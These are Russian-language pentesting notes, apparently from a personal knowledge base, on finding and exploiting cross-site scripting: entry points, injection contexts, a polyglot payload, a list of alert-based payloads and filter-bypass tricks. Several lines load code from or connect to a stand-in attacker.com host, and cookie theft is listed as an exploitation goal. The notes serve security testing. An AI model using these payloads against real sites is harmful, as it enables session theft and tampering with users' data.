
# 1. Поиск уязвимости

## 1.1 Определить вид XSS-атаки:
- Отраженные - код исполняется серверными сценариями и не хранится в базе данных
- Хранимые - код хранится в базе данных
- Через DOM - код сохраняется и выполняется в браузере

### 1.2 Отраженные
##### Точки входа:
- Параметры URL
	Тестировать каждую точку входа, например, в запросах типа GET, как в примере: `https://example.com/search?query=<script>alert('XSS!');</script>`
- Формы ввода
	Ввод данных через формы (например, поля поиска, регистрации или обратной связи), которые могут напрямую отражать введенные значения на странице.
- HTTP-заголовки
	Заголовки запроса, такие как Referer, User-Agent и другие, могут быть использованы для передачи вредоносного кода. Пример: `Referer: https://attacker.com/?data=<script>alert('XSS!');</script>`
- Параметры в теле POST-запросов
	Проверка содержимого, отправляемого через POST-запросы, так как некоторые приложения могут отражать эти данные в ответе.
- Сессионные идентификаторы и токены
	Если приложение использует идентификаторы сессий или токены в URL или формах, их также следует тестировать на уязвимость к XSS.
- Атрибуты HTML
	Некоторые приложения могут отображать пользовательские данные в атрибутах HTML (например, alt, title, data-), что также требует проверки. Пример данные в атрибут `title`, например, `<div title="<script>alert('XSS!');</script>">Hover me!</div>`
- Контекст отражения
	Определите контекст, в котором данные будут отображаться. Например, текст может быть вставлен в HTML, JavaScript, CSS или URL. Это поможет выбрать правильные полезные нагрузки для тестирования.
- Тестирование потенциальной полезной нагрузки
	Используйте различные полезные нагрузки для проверки уязвимости, включая простые скрипты и более сложные сценарии. Пример: 
	`<img src=x onerror="alert('XSS!')">`
- Тестируйте альтернативные полезные нагрузки
	Разнообразьте тесты с помощью различных кодировок и методов (например, URL-кодирование, HTML-кодирование), чтобы выявить возможные уязвимости.
- Протестируйте атаку в браузере
	Выполняйте тесты в реальном браузере, чтобы увидеть, как приложение обрабатывает вредоносный код и отразит ли его на странице.

### 1.3 Хранимые

##### Точки входа:
- **Параметры в URL и теле сообщения**
	Данные, передаваемые через GET или POST-запросы.
- **Путь к файлу URL**
	Входные данные, которые могут быть обработаны приложением.
- **HTTP-заголовки**
	Заголовки запроса, которые могут содержать уязвимые данные.
- **Внеполосные маршруты**
	Данные из внешних источников (например, электронные письма, сторонние твиты, агрегированные новости).

##### Точки выхода:
- **HTTP-ответы**
	Все ответы, возвращаемые пользователю, могут содержать вредоносные данные.
- **Отображаемые имена и другие пользовательские данные**
	Могут быть выданы в скрытых или видимых частях приложения (например, журналы аудита).
- **Данные, хранящиеся в приложении**
	Уязвимы к перезаписи через другие функции (например, результаты поиска).


#### 1.3.1 Хранимые Blind

- Имеют такие же точки входа, но проблема в том что мы не можем сразу увидеть результат

- Необходимо учитывать множество контекстов, в которых может выполняться код: 
	внутри одинарных или двойных кавычек, различных атрибутов и т.д.


### 1.4 Через DOM

- Из-за различий в реализациях DOM некоторые браузеры оказываются уязвимыми, некоторые — нет. 

----

# 2. Отражённая XSS 

## 2.1 [[Контексты межсайтового скриптинга|Определение контекста]]

- XSS между тегами HTML
- XSS в атрибутах тега HTML
- XSS в JavaScript
	Завершение существующего скрипта
	Вырывание строки JavaScript
	Использование HTML-кодирования
	XSS в литералах шаблонов JavaScript
- XSS через внедрение шаблона на стороне клиента

## 2.2 [[Методика эксплуатации отражённой XSS#Варианты эксплуатации отражённой XSS|Варианты эксплуатации отражённой XSS]]

- Для кражи файлов cookie
- Изменение данных пользователей
- Перенаправление на вредоносные сайты
- Кража данных из DOM
- Кража данных из DOM

----
# 3.  Хранимая видимая XSS

### 3.1 Определение контекста

Контекст хранимой xss атаки такой же как и отражённой, то есть может быть и:
- между тегами HTML
- в атрибутах тега HTML
- в JavaScript
	Завершение существующего скрипта
	Вырывание строки JavaScript
	Использование HTML-кодирования
	XSS в литералах шаблонов JavaScript
- через внедрение шаблона на стороне клиента

## 3.2 [[Методика эксплуатации хранимой видимой XSS#Варианты эксплуатации хранимой видимой XSS|Варианты эксплуатации отражённой XSS]]

- Для кражи файлов cookie
- Изменение данных пользователей
- Перенаправление на вредоносные сайты
- Кража данных из DOM
- Кража данных из DOM

----
# 4. Эксплуатация Хранимой слепой


---
# XSS-полиглоты

- Проверять различные параметры может помочь использование полиглотов это специальные пейлоады, которые могут выполняться в различных контекстах HTML и JavaScript.

Они предназначены для обхода фильтров и защиты, которые могут быть установлены на веб-приложении.
```
javascript:/*--></marquee></script></title></textarea></noscript></style></xmp>">[img=1]<img -/style=-=expression&#40&#47;&#42;’/-/*&#39;,/**/eval(name)//&#41;;width:100%;height:100%;position:absolute;behavior:url(#default#VML);-o-link:javascript:eval(title);-o-link-source:current name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) background=javascript:eval(name)//>
```
Существуют множество пейлоадов-полиглотов, которые можно найти в репозиториях, таких как SecLists или [fuzzdb](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/xss/XSSPolyglot.txt)



----
# 5. Эксплуатация Через DOM

- приемник, поддерживающий динамическое выполнение кода, например `eval()`или `innerHTML`. позволяет эксплуатировать 

- document.write() - работает с `<script></script>`
- innerHTML - позволяет получать или устанавливать HTML-содержимое элемента

----
# 6. Обход защит от xss
## Варианты полезной нагрузки

#### Простое окошко xss атаки
	`<script>alert('XSS Attack!');</script>`
- **Условия работы**:
    - Сервер не экранирует или не фильтрует входные данные.
    - Внедренный код выполняется в контексте браузера.

#### XSS через `onerror`
	`<img src="invalid.jpg" onerror=alert('XSS Attack!')>` 
- **Условия работы**:
    - Атрибуты HTML не экранируются.
    - Изображение не загружается, что вызывает выполнение `onerror`.

#### XSS через `onload`
	`<img src="valid.jpg" onload=alert('XSS Attack!')>` 
- **Условия работы**    
    - Атрибуты HTML не экранируются.
    - Изображение успешно загружается, что вызывает выполнение `onload`.

#### XSS через SVG
	`<svg/onload=alert(1)>`
- **Условия работы**:
    - SVG-файлы обрабатываются как HTML.
- **Обход**:  
    Используйте другие векторные изображения или внедряйте JavaScript.

### XSS через CSS
	`<style>@import url('http://attacker.com/xss.css');</style>`
- **Условия работы**:
    - CSS-файлы загружаются без проверки.
- **Обход**:  
    Используйте `expression()` в старых версиях IE:
    `background: expression(alert(1));`

#### XSS через WebSocket
	`new WebSocket('ws://attacker.com/xss');`
- **Условия работы**:
    - WebSocket-соединения не проверяются.
- **Обход**:  
    Используйте вредоносные payloads в сообщениях WebSocket.

####  XSS через jQuery и `URLSearchParams`
	`javascript:alert(document.cookie)`
- **Условия работы**:
    - Параметры URL передаются в JavaScript без проверки.
    - Используется `eval` или аналогичные функции.

#### XSS через `location.hash`
	`/#Say It With Flowers - Or Maybe Not onload="this.src+='<img src="1" onerror=alert(1)>'">`
- **Условия работы**:
    - Хэш URL передается в JavaScript без проверки.
    - Используется для динамического изменения содержимого страницы.

####  XSS через AngularJS
- AngularJS c {{ }}
	`{{ метод.constructor('') }}`
	`{{ $eval.constructor('alert1')() }}` 
- **Условия работы**:
    - AngularJS используется без отключения интерполяции (`{{ }}`).
    - Входные данные не экранируются.

## Методы обхода защит

#### Экранирование HTML
	`&lt;script&gt;alert(1)&lt;/script&gt;`
- **Как работает**:
    - Символы `<` и `>` заменяются на HTML-сущности.
- **Обход**:  
    Используйте альтернативные теги или атрибуты:
    `<img src="x" onerror=alert(1)>`

#### URL-кодировка
	`%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e`
- **Как работает**:
    - Код кодируется в URL-формате.
- **Обход**:  
    Используйте двойное кодирование или передачу через параметры:

#### Внедрение в атрибуты HTML
	`<div title="xss' onmouseover='alert(1)"></div>`
- **Как работает**:
    - Вредоносный код внедряется в атрибуты HTML.
- **Обход**:  
    Используйте кавычки или другие атрибуты:
    `<img src="x" onerror=alert(1)>`

#### Обход очищения тегов
	`<><img src="0" onerror="alert(1)">`
- **Как работает**:
    - Очищение тегов настроено неправильно (например, удаляет только первый тег).
- **Обход**:  
    Используйте вложенные теги или самозакрывающиеся теги:
    `<svg/onload=alert(1)>`
